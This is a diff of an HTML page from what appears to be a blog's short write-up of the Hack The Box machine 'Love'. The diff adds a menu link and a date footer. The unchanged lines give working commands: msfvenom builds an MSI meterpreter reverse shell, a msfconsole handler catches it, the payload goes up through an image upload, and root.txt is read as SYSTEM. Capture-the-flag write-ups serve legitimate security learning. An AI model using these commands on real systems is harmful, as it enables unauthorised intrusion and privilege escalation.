@@ -18,6 +18,7 @@
 				<a href="/index.html" class="menu_item">Home</a>
 				<a href="/Blogs/HTB_Love/htb_love.html" class="menu_item">FULL</a>
 				<a href="/Blogs/TLDR/index.html" class="menu_item">All TLDRs</a>
+				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
 				<hr>
 			</div>
 		</div>
@@ -39,6 +40,11 @@
 			<p class="subtitle">Getting Admin:</p>
 			<p class="content">Using some enumeration tool, we discover the box is able to "install" msi scripts as NT AUTHORITY/SYSTEM. Create a reverse shell: <span class="code">msfvenom -p windows/meterpreter/reverse_tcp -f msi lhost=&ltyour ip&gt lport=3188 > hack.msi</span>, then upload it however you like. The easiest is to simply "edit" our voters image by clicking the pencil icon beside our voters name. Start a meterpreter session: <span class="code">msfconsole; use exploit/multi/handler; set LHOST=&ltyour ip&gt; set LPORT=3188; set PAYLOAD=windows/meterpreter/reverse_tcp; exploit</span>. Upload the malicious msi then execute it through our current user session.</p>
 			<p class="content">Once the conenction is complete, run <span class="code">shell; powershell</span> to get a powershell session, then print the root.txt file: <span class="code">type C:\Users\Administrator\Desktop\root.txt</span>
+		</div>
+		<br>
+		<div class="paragraph">
+			<hr>
+			<p class="content">Date created: 2021.08.20</p>
 		</div>
 	</div>
 </body>
